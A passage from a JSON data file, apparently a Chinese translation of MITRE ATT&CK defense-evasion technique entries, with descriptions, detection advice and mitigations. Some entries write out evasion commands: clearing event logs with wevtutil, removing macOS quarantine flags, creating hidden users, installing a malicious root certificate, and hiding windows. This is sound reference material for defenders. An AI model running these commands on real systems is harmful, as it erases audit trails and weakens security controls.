的，而不是会在任何环境中出现的。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控"]
	},
	"relations": {
		"detection": "<p>检测环境键控操作可能很困难。具体取决于实现方式。监控正在生成的、收集各种系统信息或执行其他形式发现技术的可疑进程（尤其是在短时间内）可能有助于检测。</p>",
		"mitigations": [{
			"name": "不用缓解",
			"description": "执行护栏可能不应通过预防性控制来缓解，因为它可以保护意外目标不受危害。如果目标明确，应重点防止攻击者工具在活动链中更早运行，并在受到攻击时识别后续恶意行为。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "执行护栏"
}, {
	"id": "T1211",
	"description": "<p>软件漏洞利用指的是攻击者利用程序、服务或操作系统软件或内核本身中的编程错误来执行其控制的代码。防御性安全软件中可能存在可用于禁用或绕过它们的漏洞。</p><p>攻击者可以通过侦察事先知道某个环境中存在安全软件，或者他们可能在系统被攻击时或不久后检查安全软件。该安全软件很可能直接成为攻击目标。有杀毒软件被持久威胁组作为攻击目标以避免检测的示例。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["Windows错误报告", "进程监控", "文件监控"]
	},
	"relations": {
		"detection": "<p>在系统遭到破坏后不久，可能会发生利用漏洞来逃避防御的行为，以防止在以后的行动中被发现引入的和使用的其他工具。检测软件漏洞攻击可能很困难，具体取决于可用的工具。软件漏洞攻击可能并不总是成功，或者可能导致被利用的进程变得不稳定或崩溃。还要在系统上查找可能表示入侵成功的行为，例如进程的异常行为，包括写入磁盘的可疑文件、通过进程插入来试图掩盖执行的证据，以及发现技术相关的证据。</p>",
		"mitigations": [{
			"name": "应用程序隔离和沙盒",
			"description": "通过使用沙箱来利用未发现或未修补的漏洞，使攻击者难以推进其操作。也可通过其他类型的虚拟化和应用微分区来缓解某些类型漏洞攻击的影响。这些系统中仍然存在其他漏洞和弱点的风险。"
		}, {
			"name": "漏洞利用保护",
			"description": "可用安全应用，比如WDEG（Windows Defender Exploit Guard）和EMET（Enhanced Mitigation Experience Toolkit），来查找漏洞攻击行为，从而缓解某些漏洞攻击行为的影响。也可通过控制流完整性检查来识别和阻止软件攻击。许多保护措施依赖于体系结构和目标应用二进制文件的兼容性，并且可能不适用于针对防御规避的软件。"
		}, {
			"name": "威胁情报计划",
			"description": "开发一个强大的网络威胁情报能力，用来确定哪些类型和级别的威胁可能会针对特定组织实施软件攻击和零日漏洞攻击。"
		}, {
			"name": "软件更新",
			"description": "通过为内部企业端点和服务器采用补丁管理来定期更新软件。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "利用漏洞进行防御逃逸"
}, {
	"id": "T1107",
	"description": "<p>攻击者在系统上丢弃或创建恶意软件、工具或其他非本机文件，可能会留下在网络中所做事情和如何做的痕迹。攻击者可能会在入侵过程中删除这些文件减少他们的行动足迹，或者在入侵后清理过程的最后删除文件。</p><p>主机操作系统提供了清理工具，但攻击者也可能使用其他工具。例如，本地CMD函数（如DEL）、安全删除工具（如Windows Sysinternals sDelete），或其他第三方文件删除工具。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "进程命令行参数", "二进制文件元数据"]
	},
	"relations": {
		"detection": "<p>环境中与良性命令行功能（如DEL或第三方实用程序或工具）相关的事件可能不常见，具体取决于用户群和系统的典型使用方式。监控命令行删除功能从而发现攻击者丢弃和删除的二进制或其他的文件可能会导致恶意活动检测。另一个好的实践是监控已知的删除和安全删除工具，这些工具不在攻击者可能会使用的企业网络的系统上。某些监控工具可能会收集命令行参数，但可能不会捕获DEL命令，因为DEL是cmd.exe自带的函数。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "文件删除"
}, {
	"id": "T1222",
	"description": "<p>文件权限通常由文件属主指定的DACL（自由访问控制列表）管理。文件DACL的实现可能因平台而异，但通常会明确指定哪些用户/组可以执行哪些操作（例如：读、写、执行等）。</p><p>攻击者可能会修改文件权限/属性从而避开预期的DACL。他们可能会更改特定的访问权限来实施恶意活动，如修改、替换或删除特定文件。前提是根据文件的现有权限取得文件的所有权和/或提升权限（如管理员/根用户权限）。修改特定文件可能是许多技术必需的步骤，例如通过辅助功能、登录脚本建立持久性，或者污染/劫持其他工具二进制/配置文件。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"permissionRequired": ["用户", "管理员", "系统", "root"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数", "Windows事件日志"]
	},
	"relations": {
		"detection": "<p>监控和调查试图修改DACL和文件所有权的行为，例如在Windows中使用icacls、takeown、attrib和PowerShellSet-Acl，在macOS/Linux中使用chmod/chown。其中许多是系统内置的实用程序，可能会导致高误报率。因此请与基线知识进行比较来看看系统通常是如何使用的，并在可能的情况下将修改事件与其他恶意活动行为关联。</p><p>考虑对包含关键二进制/配置文件的文件夹启用文件权限更改审核。修改DACL时使用Windows安全日志事件（事件4670）。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "文件权限修改"
}, {
	"id": "T1006",
	"description": "<p>Windows允许程序直接访问逻辑卷。具有直接访问权限的程序可以通过分析文件系统数据结构直接从驱动器读取和写入文件。此技术绕过Windows文件访问控件以及文件系统监控工具。</p><p>某些实用程序（如NinjaCopy）可以在PowerShell中执行这些动作。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员"],
		"dataSources": ["API监控"]
	},
	"relations": {
		"detection": "<p>监控器句柄在进程创建的驱动器卷上打开，以确定它们何时可以直接访问逻辑驱动器。</p><p>监控进程和命令行参数，以了解可以采取哪些措施从逻辑驱动器复制文件并逃避常见文件系统保护。由于也可通过PowerShell使用此技术，因此建议开启PowerShell脚本的日志记录功能。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "文件系统逻辑偏移"
}, {
	"id": "T1144",
	"description": "<p>MacOS和OS X中，应用或程序从Internet下载时，会在<code>com.apple.quarantine</code>文件中设置一个特殊属性。执行时，苹果公司的关守防御程序会读取这个属性，并会提示用户允许或拒绝执行。</p><p>应用从USB盘、光盘、外接硬盘，甚至本地网络共享驱动器加载到系统上时，不会设置此标志。此外，其他实用程序或事件（如路过式下载）也不必设置此标志。这样就完全绕过了内置关守检查。是否有隔离标志可以使用针对<code>com.apple.quarantine</code>的xattr命令<code>xattr /path/to/MyApp.app</code>来检查。类似地，如果有sudo访问权限或提升的权限，也可以使用xattr命令<code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>来删除此属性。</p><p>在典型操作中，文件将从Internet下载，并在保存到磁盘之前打上隔离标志。当用户试图打开文件或应用时，MacOS的关守将介入并检查是否存在此标志。如果存在此标志，那么MacOS会提示用户确认运行程序，甚至会给出应用URL。但是，这一切的前提是文件是从智能隔离应用下载的。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["文件监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控用户而非操作系统删除<code>com.apple.quarantine</code>标志的行为是可疑操作，应进一步检查。监控和调查使用<code>xattr</code>等工具修改扩展文件属性的尝试。内置系统实用程序可能会生成高误报警报，因此请与基线知识作比较以了解系统的典型使用方式，并在可能的情况下将修改事件与其他恶意活动迹象相关联。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "配置系统设置来阻止运行非通过Apple Store下载的应用，这有助于减少一些问题的发生。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "关守绕过"
}, {
	"id": "T1484",
	"description": "<p>攻击者可能会修改组策略对象（GPO）来破坏域的预期自由访问控制，通常目的是提升域内权限。</p><p>组策略允许集中管理活动目录（AD）中的用户和计算机设置。GPO是组策略设置的容器，由存储在可预测网络路径<code>\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>中的文件组成。</p><p>与AD中的其他对象一样，GPO具有与其关联的访问控制。默认情况下，域中所有的用户帐户都有权读取GPO。可以将GPO访问控制权限（例如写入访问权限）委派给域中的特定用户或组。</p><p>攻击者可通过恶意修改GPO来实施计划任务、禁用安全工具、复制远程文件、创建帐户、执行服务等。</p><p>由于GPO可以控制AD环境中的众多用户和计算机设置，GPO的滥用可能会导致大量攻击。通过修改GPO设置（在本例中为修改<code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>），可以利用诸如New-GPOImmediateTask之类的公共脚本来自动创建恶意计划任务。某些情况下，攻击者可能会修改特定用户权限，比如在<code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>中设置seEnableDelegationPrivilege，以实现一个微妙的AD后门，因为在攻击者控制下的用户帐户能够修改GPO。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "用户"],
		"dataSources": ["Windows事件日志"]
	},
	"relations": {
		"detection": "<p>可以通过Windows事件日志来监控目录服务更改，从而检测GPO修改。可能会记录好几个关于此类GPO修改的事件，包括：<i>事件</i><em>5136 </em>- 目录服务对象被修改，<i>事件</i><i>5137</i> -目录服务对象已创建，<i>事件</i><em>5138 </em>- 目录服务对象未删除，<i>事件</i><em>5139</em> - 目录服务对象已移动，<i>事件</i><em>5141</em> - 目录服务对象已删除。</p><p>GPO滥用通常会伴随一些其他行为，例如计划任务。可检测这些行为的相关事件来确定GPO是否被滥用。也可以搜索后续的权限值修改（比如对SeEnableDelegationPrivilege的修改）来确定是否有新登录权限分配事件（事件4672）和用户权限分配事件（事件4704）。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "使用诸如Bloodhound（1.5.1及更高版本）之类的审核工具来识别和纠正GPO权限滥用机会（例如：GPO修改权限）。"
		}, {
			"name": "用户账户管理",
			"description": "考虑实施WMI和安全筛选，以进一步定制GPO将应用于哪些用户和计算机。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "组策略修改"
}, {
	"id": "T1147",
	"description": "<p>macOS中的每个用户帐户都有一个与其关联的用户ID。创建用户时，可以为该帐户指定用户ID。<code>/Library/Preferences/com.apple.loginwindow</code>中有一个名为Hide500Users的属性值，可用于防止ID为500及更低的用户出现在登录屏幕。通过ID低于500的用户使用帐户创建技术并启用此属性（将其设置为Yes），攻击者可以更轻松地隐藏其用户帐户：<code>sudo dscl . -create /Users/username UniqueID 401</code>。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["管理员", "root用户"],
		"dataSources": ["认证日志", "文件监控"]
	},
	"relations": {
		"detection": "<p>此技术可防止新用户显示在登录屏幕中，但新用户的所有其他迹象仍然存在。用户仍获取主目录，并将显示在身份验证日志中。</p>",
		"mitigations": [{
			"name": "操作系统配置",
			"description": "如果计算机已加入域，可使用组策略来帮助限制创建或隐藏用户的能力。同样，禁止修改/Library/Preferences/com.apple.loginwindow中的Hide500Users值将强制用户可见。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "隐藏用户"
}, {
	"id": "T1143",
	"description": "<p>攻击者可能会通过隐藏窗口来遮掩其恶意活动以免被用户看到。某些情况下，可以隐藏应用程序执行操作时通常会出现的窗口。执行管理任务时，系统管理员可以利用此功能来避免中断用户环境。攻击者可能会滥用操作系统功能来隐藏用户可见窗口，以免系统提醒用户有攻击活动。</p><p>Windows</p><p>Windows中的脚本语言（例如PowerShell，Jscript和VBScript）有多种功能可用来隐藏窗口。例如，<code> powershell.exe -WindowStyle Hidden</code>。</p><p>Mac</p><p>属性列表 （plist） 文件中列出了应用程序如何在 macOS上运行的配置。这些文件中的标记之一可以是apple.awt.UIElement，它允许 Java 应用程序防止应用程序的图标出现在 Dock 中。这样做的一个常见用途是希望应用程序在系统托盘中运行时，不显示在 Dock 中。但是，攻击者可能会滥用此功能并隐藏其运行窗口。</p>",
	"details": {
		"platform": ["macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["Windows事件日志", "PowerShell日志", "进程命令行参数", "进程监控", "文件监控"]
	},
	"relations": {
		"detection": "<p>监控进程和命令行参数，查看是否有隐藏窗口的相关活动。Windows中，启用并配置事件日志功能以及PowerShell日志功能以检查隐藏窗口样式。MacOS中，Plist文件是具有特定格式的ASCII文本文件，因此它们相对容易分析。可通过文件监控来检查plist文件中的apple.awt.UIElement或任何其他可疑标记，并对其进行标记。</p>",
		"mitigations": [{
			"name": "执行限制",
			"description": "使用杀毒软件来限制程序执行。MacOS中允许具有此 plist 标记的白名单程序。所有其他程序应视为可疑程序。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "隐藏窗口"
}, {
	"id": "T1148",
	"description": "<p><code> </code></p><p><code>HISTCONTROL</code>环境变量跟踪历史记录命令应保存的内容，并在用户注销时最终保存到<code>~/.bash_history</code>中。可将变量设置为“ignorespace”来忽略以空格开头的命令。还可以将其设置为“ignoredups”来忽略重复的命令。在某些Linux系统中，变量默认设置为\"ignoreboth\"，即忽略以空格开头的命令和重复的命令。这意味着不会保存\"ls\"，但会保存\"ls\"历史记录。默认情况下，macOS上不存在<code>HISTCONTROL</code>，但用户可以设置并受重视。攻击者只需在所有终端命令前加一个空格即可在操作中不留痕迹。</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "认证日志", "文件监控", "环境变量"]
	},
	"relations": {
		"detection": "<p>如果用户会话与其<code>.bash_history</code>中明显缺少新命令有相关性，可以此为线索来查看是否有可疑行为。此外，用户检查或更改其<code>HISTCONTROL</code>环境变量的行为也是可疑的。</p>",
		"mitigations": [{
			"name": "环境变量权限",
			"description": "禁止用户修改HISTCONTROL环境变量。"
		}, {
			"name": "操作系统配置",
			"description": "确保HISTCONTROL环境变量被设置为\"ignoredup\"而不是\"ignoreboth\"或者\"ignorespace\"。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "HISTCONTROL"
}, {
	"id": "T1054",
	"description": "<p>攻击者可能会试图阻止通常由感测器捕获的指标或事件被收集和分析。这可能包括通过篡改控制事件遥测的收集和流程相关设置来恶意重定向或甚至禁用基于主机的感测器，比如Windows事件跟踪（ETW）。这些设置可能存储在系统上的配置文件中和/或注册表中，也可能通过诸如PowerShell或Windows ManagementInstrumentation的管理实用程序访问。</p><p>可以通过多种方式来实现ETW中断，但是最直接的方法是使用PowerShellSet-EtwTraceProvider cmdlet来定义条件，或者直接与注册表交互来进行更改。</p><p>攻击者可能会试图阻止收集和分析通常由传感器捕获的指示或事件，包括修改存储在配置文件和/或注册表项中的传感器设置，从而禁用或恶意重定向事件遥测。如果指标信息是通过网络上报的，攻击者可能会阻断上报流量来躲避中心分析。这可以通过多种方式来实现，例如停止负责转发遥测的本地进程和/或创建基于主机的防火墙规则来阻断到负责聚合事件的特定主机的通信，例如SIEM（安全信息和事件管理）产品。</p>",
	"details": {
		"platform": ["Windows"],
		"dataSources": ["传感器健康和状态", "进程命令行参数", "进程监控"]
	},
	"relations": {
		"detection": "<p>检测主机传感器是否缺少报告活动。不同的阻塞方式可能会导致不同的报告中断形式。系统可能会突然停止报告所有数据或仅报告某些类型的数据。</p><p>根据收集的主机信息的类型，分析人员可能会检测到触发进程停止或连接阻断的相关事件。例如，Sysmon会在其配置状态发生更改（事件16）时记录日志，并且Windows Management Instrumentation（WMI）可能被用于订阅ETW提供程序，只要有任何提供程序从特定跟踪会话中删除都会记录日志。要检测ETW中的更改，你还可以监控包含所有ETW事件提供程序配置的注册表项<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME{{PROVIDER_GUID}}</code>。</p>",
		"mitigations": [{
			"name": "文件和目录权限限制",
			"description": "确保事件跟踪器/转发器、防火墙策略和其他相关机制已通过适当的权限和访问控制进行了保护。"
		}, {
			"name": "软件配置",
			"description": "考虑定期（例如，临时、登录时）自动重启转发机制，以及对防火墙规则和其他相关系统配置实施适当的更改管理。"
		}, {
			"name": "用户账号管理",
			"description": "确保事件跟踪器/转发器、防火墙策略和其他相关机制已通过适当的权限和访问控制进行了保护，并且不能由用户账号操控。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "指示信号拦截"
}, {
	"id": "T1066",
	"description": "<p>如果恶意工具被检测到并隔离或以其他方式制止，攻击者也许能够确定恶意工具被检测到的原因（指标），通过删除指标来修改该工具，并使用可以不再被目标的防御系统或可能使用类似系统的后续目标所能探测到的更新后版本。</p><p>一个很好例子的是，带文件签名的恶意软件被检测到并被杀毒软件隔离。如果攻击者确定恶意软件因其文件签名而被隔离，则可能会使用\"软件打包\"或他方式修改文件签名，然后再使用该恶意软件。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["进程使用网络", "进程监控", "进程命令行参数", "杀毒软件", "二进制文件元数据"]
	},
	"relations": {
		"detection": "<p>首次检测到恶意工具可能会触发杀毒软件或其他安全工具警报。类似事件也可能通过网络IDS、电子邮件扫描设备等在边界上发生。初始检测应被视为表示有潜在更具侵略性性的入侵。警报系统应彻底调查以找出超出初始警报未检测到的活动。假设不会调查单个事件（如杀毒软件检测）或分析人员无法最终将该事件与网络上发生的其他活动联系在一起，则攻击者可能会继续执行操作。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "删除工具中指标"
}, {
	"id": "T1070",
	"description": "<p>攻击者可能会删除或更改主机系统上的生成物，包括日志和捕获的文件，例如隔离的恶意软件。尽管日志的位置和格式会有所不同，但典型的有机系统日志会被捕获为Windows事件或Linux/MacOS文件，如Bash History和/var/log/*。</p><p>事件干扰操作和其他可用于检测入侵活动的通知可能会损害安全解决方案的完整性，导致事件无法报告。它们也可能会导致取证分析和事件响应变得更加困难，因为它们缺乏足够的数据来确定发生了什么。</p><p>清除Windows事件日志</p><p>Windows事件日志是计算机警报和通知记录。微软将事件定义为“系统或程序中需要通知用户或将条目添加到日志中的任何重要事件”。有三个系统定义的事件源：系统、应用和安全。</p><p>执行账号管理、账号登录和目录服务访问等相关操作的攻击者可以选择清除事件来隐藏其活动。</p><p>可以使用以下实用程序命令清除事件日志：</p><p>·         <code>wevtutil cl system</code></p><p>·         <code>wevtutil cl application</code></p><p>·         <code>wevtutil cl security</code></p><p>也可以使用其他机制（如PowerShell）清除日志。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数", "API监控", "Windows事件日志"]
	},
	"relations": {
		"detection": "<p>监控文件系统来检测是否有不当删除或修改指标文件的行为。例如，删除Windows事件日志（通过本机二进制文件、API函数或PowerShell）可能会生成可变事件（事件1102：“已清除审核日志”）。文件系统中未存储的事件可能需要不同的检测机制。</p>",
		"mitigations": [{
			"name": "敏感信息加密",
			"description": "在本地和传输中混淆/加密事件文件，避免向攻击者提供反馈。"
		}, {
			"name": "远程数据存储",
			"description": "自动将事件转发到日志服务器或数据存储库，防止攻击者在本地系统上定位和操控数据。尽可能缩短事件报告的时间延迟，避免在本地系统上长时间存储。"
		}, {
			"name": "文件和目录权限限制",
			"description": "通过适当权限和身份验证来保护本地存储的事件文件，并通过防止权限升级来限制对手提升权限。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "删除主机上指示信息"
}, {
	"id": "T1202",
	"description": "<p>可以使用各种Windows实用程序来执行命令，而不需要调用cmd。例如，Forfiles、程序兼容性助手（pcalua.exe）、WSL（WindowsSubsystem for Linux）组件以及其他实用程序可以从命令行界面、运行窗口或通过脚本来调用程序和命令的执行。</p><p>攻击者可能会滥用这些功能来规避防御，尤其是在破坏检测和/或缓解控制（如组策略）的同时执行任意动作。（这些控制限制/阻止了cmd或恶意负载相关文件扩展名的使用。）</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数", "Windows事件日志"]
	},
	"relations": {
		"detection": "<p>监控和分析基于主机的检测机制（如Sysmon）中的日志来查看事件，比如查看是否有进程创建事件（创建过程中使用了参数来调用程序/命令/文件和/或生成子进程/网络连接，或者该创建是由这些参数导致的）。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "间接命令执行"
}, {
	"id": "T1130",
	"description": "<p>根证书在公钥加密中用于标识根证书颁发机构（CA）。安装根证书后，系统或应用将信任根证书签名的根信任链中的证书。证书通常用于在web浏览器中建立安全的TLS/SSL通信。当用户试图浏览提供不受信任证书的网站时，将显示一条错误消息，警告用户存在安全风险。根据安全设置，浏览器可能不允许用户建立与该网站的连接。</p><p>攻击者可能会通过在其入侵的系统上安装根证书的方式来降低该系统安全性。攻击者已使用这种技术来避免在入侵系统通过HTTPS连接到攻击者控制的网络服务器时（攻击者用这些服务器来欺骗合法网站从而收集用户登录凭据）给用户安全警告提示。制造商在系统或软件供应链中也预先安装了非典型根证书。如果这些非典型根证书与恶意软件/广告软件一起使用，会给中间人提供拦截TLS/SSL传输信息的能力。</p><p>根证书（及其关联的链）也可以克隆和重新安装。克隆的证书链将携带许多与源根证书相同的元数据特征，并可用于对恶意代码进行签名。签名后，这些恶意代码可能会绕过签名验证工具（例如：Sysinternals、antivirus等）。签名验证工具用于阻止执行和/或发现持久性工具。</p><p>MacOS中，Ay Mami恶意软件使用<code>/usr/bin/security add-trusted-cert -d -r trustRoot -k/Library/Keychains/System.keychain /path/to/malicious/cert</code>将恶意证书作为受信任的根证书安装到系统密钥链中。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"permissionRequired": ["管理员", "用户"],
		"dataSources": ["SSL/TLS检查", "数字证书日志"]
	},
	"relations": {
		"detection": "<p>系统的根证书不太可能经常更改。监控系统上可能由恶意活动触发安装的新证书。检查新系统上预安装的证书，确保不存在不必要或可疑的证书。微软在线并通过authroot.stl提供可信任的根证书列表。也可以使用Sysinternals Sigcheck实用程序（<code>sigcheck[64].exe -tuv</code>）转储证书库里的证书，并列出微软证书信任列表未包含的有效证书。</p><p>已安装的根证书位于注册表中的<code>HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\</code>和<code>[HKLMor HKCU]\\Software[\\Policies]\\Microsoft\\SystemCertificates\\Root\\Certificates\\</code>下。</p><p>有一个根证书子集。这个子集中的根证书在Windows系统中是一致的，可用于做比较。</p><p>·         18F7C1FCC3090203FD5BAA2F861A754976C8DD25</p><p>·         245C97DF7514E7CF2DF8BE72AE957B9E04741E85</p><p>·         3B1EFD3A66EA28B16697394703A72CA340A05BD5</p><p>·         7F88CD7223F3C813818C994614A89C99FA3B5247</p><p>·         8F43288AD272F3103B6FB1428485EA3014C0BCFE</p><p>·         A43489159A520F0D93D032CCAF37E7FE20A8B419</p><p>·         BE36A4562FB2EE05DBB3D32323ADF445084ED656</p><p>·         CDD4EEAE6000AC7F40C3802C171E30148030C072</p>",
		"mitigations": [{
			"name": "操作系统配置",
			"description": "可使用Windows组策略来管理根证书，并且可以将HKLM\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\ProtectedRoots的Flags值设置为1来防止非管理员用户在自己的HKCU证书存储中再安装根证书。"
		}, {
			"name": "软件配置",
			"description": "HTTP公钥锁定（HPKP）用于缓和中间人攻击，即攻击者强制使用预期的错误或欺诈证书来拦截加密通信。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "安装根证书"
}, {
	"id": "T1149",
	"description": "<p>自OS X 10.8起，mach-O二进制文件引入了一个名为LC_MAIN的新文件头，指向二进制文件的入口点以执行文件。以前，有两个文件头来实现相同的效果：LC_THREAD和LC_UNIXTHREAD。攻击者可能会劫持二进制文件的入口点来执行他们恶意添加的另一部分或代码洞穴，然后再返回初始入口点，使得受害者无法感知有何不同。攻击者以这种方式修改二进制文件可以绕过应用程序白名单，因为文件名或应用程序路径仍然相同。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["二进制文件元数据", "恶意代码逆向工程", "进程监控"]
	},
	"relations": {
		"detection": "<p>确定二进制文件的原始入口点很困难，但校验和及签名验证是非常可能确定的。修改LC_MAIN入口点或添加其他LC_MAIN入口点会使文件的签名无效，并且该行为会被检测到。收集正在运行的进程信息，并与已知应用程序进行比较，以查找可疑行为。</p>",
		"mitigations": [{
			"name": "代码签名",
			"description": "对所有应用程序上的签名代码强制使用有效的数字签名，并且仅信任具有受信任方签名的应用程序。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "LC_MAIN劫持"
}, {
	"id": "T1036",
	"description": "<p>伪装指的是攻击者操纵或滥用可执行文件（不管是合法还是恶意的）的名称或位置来逃避防御和观察。已经发现了以下几种技术变体：</p><p>一种变体是将可执行文件放在通常受信任的目录中，或者将文件命名为合法受信任程序的名称。另外，也可能将文件命名为与合法程序很相近的名称，或其它无伤大雅的名称。比如，移动并重命名一个公共系统实用工具或程序来规避其对其使用情况的检测。这样做是为了绕过依赖文件名或路径来信任可执行文件的工具，以及通过将文件名与其它合法事物相关联来欺骗防御程序和系统管理员认为文件是善意的。</p><p>另外一种变体使用从右向左覆盖（RTLO或RLO）字符（U+202E）的方法诱骗用户执行他们认为的善意文件类型但实际上是可执行代码。RTLO是非打印字符，它会导致后面的文本反向显示。例如，一个名为<code>March 25 \\u202Excod.scr</code> 的Windows屏幕保护程序文件将显示为<code>March 25 rcs.docx</code>，名为 <code>photo_high_re\\u202Egnp.js</code> 的JavaScript文件将显示为<code>photo_high_resj.png</code>。这种技术的一个常见做法是使用网络钓鱼攻击附件，因为它可以欺骗邮件双方和防御程序，如果恰好他们不知道自己的工具如何显示和呈现RTLO字符。在许多针对性的入侵企图和犯罪活动中都可以看到RTLO字符的使用。RTLO也可用于Windows注册表，其中regedit.exe显示相反的字符，但命令行工具reg.exe默认情况下不这么显示。</p><p>攻击者可能会修改二进制文件的元数据，包括图标、版本、产品名称、描述和版权等字段，以便更好地与环境融合，增加欺骗安全分析师或产品的可能性。</p><p>Windows</p><p>在这种技术的另一种变体中，攻击者可能会使用合法实用程序的重命名副本，例如rundll32.exe。另一种情况是，将合法实用程序移动到其他目录并重命名来规避从非标准路径执行的系统实用程序的检测。</p><p>举例：Windows中，攻击者会滥用受信任位置<code>C:\\Windows\\System32</code>，会把恶意二进制文件命名为受信任二进制名称“explorer.exe”和“svchost.exe”。</p><p>Linux</p><p>此技术的另一个变体包括恶意二进制文件启动后（与以前相反）将运行进程的名称更改为可信或良性进程的名称。</p><p>举例：Linux中，攻击者会滥用受信任位置/<code> bin</code>，会把恶意二进制文件命名为受信任二进制名称“rsyncd”和“dbus-inotifier”</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["文件监控", "进程监控", "二进制文件元数据"]
	},
	"relations": {
		"detection": "<p>采集文件哈希；与预期哈希不匹配的文件名是可疑的。执行文件监控；异常位置出现已知名称的文件是可疑的。同样，非升级或打补丁期间所做的文件修改也是可疑的。</p><p>如果磁盘上的文件名与二进制PE元数据的文件名不匹配，这可能表示二进制文件在编译后已被重命名。收集和比较二进制文件的磁盘和资源文件名以及查看InternalName、OriginalFilename和/或ProductName是否与预期匹配可以提供有用的线索，但并不总是表示存在恶意活动。不要关注文件可能的名称，而应关注已知会使用的命令行参数。这些参数很明确，因为这样会有更好的检测率。</p><p>对于RTLO，检测方法应包括在文件名中查找RTLO字符的常见格式，如“\\u202E”、“[U+202E]”和“%E2%80%AE”。防御程序还应检查他们的分析工具，以确保工具不会解释RTLO字符，而是打印包含这些字符的文件的真实名称。</p>",
		"mitigations": [{
			"name": "代码签名",
			"description": "要求有签名的二进制文件。"
		}, {
			"name": "执行预防",
			"description": "对于所需的常用操作系统实用程序，请使用工具通过属性白名单而不是文件名来限制程序执行。"
		}, {
			"name": "文件和目录权限限制",
			"description": "通过文件系统访问控制来保护文件夹，如C:\\ Windows\\System32。"
		}],
		"tactics": ["TA0005"]
	},
	"name": "伪装"
}, {
	"id": "T1112",
	"description": "<p>攻击者可能会与Windows注册表交互，在注册表项中隐藏配置信息，删除信息，或辅助获得持久性或辅助执行。</p><p>能否访问注册表的特定区域取决于账号权限，有些需要管理员级别的访问权限。Windows内置的命令行实用程序Reg 可用于本地或远程注册表修改。还可以使用其他能通过调用Windows API（参见示例）与注册表交互的工具，例如远程访问工具。</p><p>注册表修改还可以包括隐藏键的操作，例如在键名称前面加上一个空字符，这将导致使用regor或其他实用程序通过调用win32 API读取数据时出错并且被忽略。攻击者可能会滥用这些伪隐藏密钥来隐藏用于建立持久性的负载/命令。</p><p>可以修改远程系统的注册表，辅助执行文件来横向移动。前提是远程注册表服务需要在目标系统上运行。通常需要有效的账号，可以访问远程系统的Windows Admin Shares进行RPC通信。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["Windows注册表", "文件监控", "进程监控", "进程命令行参数", "Windows事件日志"]
	},
	"relations": {
